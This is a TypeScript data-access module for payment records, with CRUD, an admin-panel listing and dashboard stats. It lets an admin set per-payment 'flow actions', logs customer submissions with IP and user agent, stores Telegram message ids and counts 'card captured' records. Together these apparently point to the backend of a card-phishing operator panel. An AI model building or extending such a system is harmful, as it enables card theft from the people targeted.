import {
  Payment,
  PaymentDoc,
  PaymentStatus,
  FlowSubmission,
} from "../models/payment.model";

export const paymentDao = {
  async create(data: Partial<PaymentDoc>): Promise<PaymentDoc> {
    return Payment.create(data);
  },

  async updateStatus(
    reference: string,
    status: PaymentStatus,
    telegramMessageId?: number,
  ): Promise<PaymentDoc | null> {
    return Payment.findOneAndUpdate(
      { reference },
      { status, ...(telegramMessageId ? { telegramMessageId } : {}) },
      { new: true },
    );
  },

  async findByReference(reference: string): Promise<PaymentDoc | null> {
    return Payment.findOne({ reference });
  },

  async findById(id: string): Promise<PaymentDoc | null> {
    return Payment.findById(id);
  },

  /** Sets (or clears) the admin-chosen flow action. */
  async setFlowAction(
    id: string,
    action: string | null,
  ): Promise<PaymentDoc | null> {
    return Payment.findByIdAndUpdate(
      id,
      { flowAction: action, flowActionAt: action ? new Date() : null },
      { new: true },
    );
  },

  /** Clears the flow action by reference (used when the customer arrives on the target page). */
  async clearFlowAction(reference: string): Promise<PaymentDoc | null> {
    return Payment.findOneAndUpdate(
      { reference },
      { flowAction: null, flowActionAt: null },
      { new: true },
    );
  },

  /** Appends a flow-screen submission and records ip/ua. */
  async appendFlowSubmission(
    reference: string,
    submission: FlowSubmission,
  ): Promise<PaymentDoc | null> {
    return Payment.findOneAndUpdate(
      { reference },
      {
        $push: { flowSubmissions: submission },
        ...(submission.ip ? { ip: submission.ip } : {}),
        ...(submission.userAgent ? { userAgent: submission.userAgent } : {}),
      },
      { new: true },
    );
  },

  async updateById(
    id: string,
    update: Partial<PaymentDoc>,
  ): Promise<PaymentDoc | null> {
    return Payment.findByIdAndUpdate(id, update, { new: true });
  },

  async deleteById(id: string): Promise<PaymentDoc | null> {
    return Payment.findByIdAndDelete(id);
  },

  /** Paginated list for the admin panel, newest first, with optional text search. */
  async list({
    page,
    limit,
    search,
  }: {
    page: number;
    limit: number;
    search?: string;
  }) {
    const filter = search
      ? {
          $or: [
            { reference: { $regex: search, $options: "i" } },
            { fullName: { $regex: search, $options: "i" } },
            { mobile: { $regex: search, $options: "i" } },
            { email: { $regex: search, $options: "i" } },
            { identifier: { $regex: search, $options: "i" } },
          ],
        }
      : {};

    const [items, total, amountAgg] = await Promise.all([
      Payment.find(filter)
        .sort({ createdAt: -1 })
        .skip((page - 1) * limit)
        .limit(limit)
        .lean(),
      Payment.countDocuments(filter),
      Payment.aggregate<{ sum: number }>([
        { $match: filter },
        { $group: { _id: null, sum: { $sum: "$amount" } } },
      ]),
    ]);

    return { items, total, totalAmount: amountAgg[0]?.sum ?? 0 };
  },

  /** Dashboard aggregates. */
  async stats() {
    const [total, amountAgg, awaiting, byStatus, recent] = await Promise.all([
      Payment.countDocuments({}),
      Payment.aggregate<{ sum: number }>([
        { $group: { _id: null, sum: { $sum: "$amount" } } },
      ]),
      // "Awaiting decision" = card captured but no flow action set yet.
      Payment.countDocuments({
        cardNumber: { $exists: true, $ne: null },
        $or: [{ flowAction: null }, { flowAction: { $exists: false } }],
      }),
      Payment.aggregate<{ _id: string; count: number }>([
        { $group: { _id: "$status", count: { $sum: 1 } } },
      ]),
      Payment.find({}).sort({ createdAt: -1 }).limit(8).lean(),
    ]);

    const statusCounts: Record<string, number> = {};
    for (const s of byStatus) statusCounts[s._id] = s.count;

    return {
      total,
      totalAmount: amountAgg[0]?.sum ?? 0,
      awaiting,
      statusCounts,
      recent,
    };
  },
};
